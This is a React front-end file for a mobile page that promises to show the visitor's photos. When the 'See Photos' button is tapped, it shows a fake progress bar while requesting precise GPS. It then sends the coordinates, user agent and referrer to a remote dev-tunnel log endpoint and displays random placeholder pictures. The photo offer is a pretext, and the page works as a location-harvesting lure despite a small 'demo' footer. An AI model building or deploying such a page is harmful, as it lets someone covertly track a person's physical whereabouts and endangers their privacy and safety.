import React, { useState } from "react";
import "./App.css";

// Dev Tunnel backend URL — update if different
const BACKEND_URL = "https://300w2zzm-4000.inc1.devtunnels.ms";

/** helper: post log to backend */
async function sendLog(action, extra = {}) {
  try {
    await fetch(`${BACKEND_URL}/log`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action,
        path: window.location.pathname + window.location.search,
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
        ...extra,
      }),
    });
  } catch (err) {
    console.error("Failed to send log", err);
  }
}

export default function App() {
  const [loading, setLoading] = useState(false);
  const [progress, setProgress] = useState(0); // fake progress %
  const [photosVisible, setPhotosVisible] = useState(false);
  const [locationStatus, setLocationStatus] = useState(null); // "granted" | "denied" | null

  // fake loader progress ramp
  function startFakeProgress(onComplete) {
    setProgress(0);
    let p = 0;
    setLoading(true);
    const iv = setInterval(() => {
      p += Math.random() * 12; // jumpy increments
      if (p >= 98) p = 98; // hold before complete
      setProgress(Math.floor(p));
    }, 250);

    // ensure minimum loader time (~1.6s) and finish after geolocation resolves
    // We'll return a function to stop when we want to finish
    return () => {
      clearInterval(iv);
      setProgress(100);
      setTimeout(() => {
        setLoading(false);
        setProgress(0);
        onComplete && onComplete();
      }, 350); // small fade time
    };
  }

  async function handleSeePhotosClick() {
    // start fake progress and get a stopper function
    const finish = startFakeProgress(async () => {
      // nothing here — will be called by stopper below
    });

    // Try to get geolocation (user gesture — should prompt on mobile)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          setLocationStatus("granted");
          // send GPS to backend
          await sendLog("see_photos", {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          });
          finish(); // stop loader and show photos
          setPhotosVisible(true);
        },
        async (err) => {
          // user denied or unavailable
          console.warn("Geolocation error:", err);
          setLocationStatus("denied");
          // send fallback log (no coords)
          await sendLog("see_photos", { location_error: err.message || err.code });
          finish();
          setPhotosVisible(true);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      // geolocation not supported
      setLocationStatus("denied");
      await sendLog("see_photos", { location_error: "geolocation_not_supported" });
      finish();
      setPhotosVisible(true);
    }
  }

  return (
    <div className="mobile-shell">
      <header className="topbar">
        <div className="brand">Photos</div>
        <div className="sub">Demo</div>
      </header>

      <main className="landing">
        {!photosVisible && (
          <>
            <div className="hero">
              <div className="hero-title">Your memories, in one place</div>
              <p className="hero-sub">Tap below to view photos</p>
              <button className="cta" onClick={handleSeePhotosClick} disabled={loading}>
                See Photos
              </button>

              {loading && (
                <div className="loader-wrap">
                  <div className="spinner" aria-hidden />
                  <div className="progress">
                    <div className="progress-bar" style={{ width: `${progress}%` }} />
                  </div>
                  <div className="loader-text">Preparing your photos… {progress}%</div>
                </div>
              )}

              {locationStatus === "denied" && (
                <div className="note">Location permission denied — photos still shown</div>
              )}
            </div>

            <footer className="mobile-footer">Simple demo — location requested while loading</footer>
          </>
        )}

        {photosVisible && (
          <section className="photos-grid">
            {/* A small grid of placeholder images */}
            {Array.from({ length: 12 }).map((_, i) => (
              <div className="photo-card" key={i}>
                <img
                  alt={`photo-${i}`}
                  src={`https://picsum.photos/seed/demo-${i}/400/400`}
                  loading="lazy"
                />
              </div>
            ))}
          </section>
        )}
      </main>
    </div>
  );
}
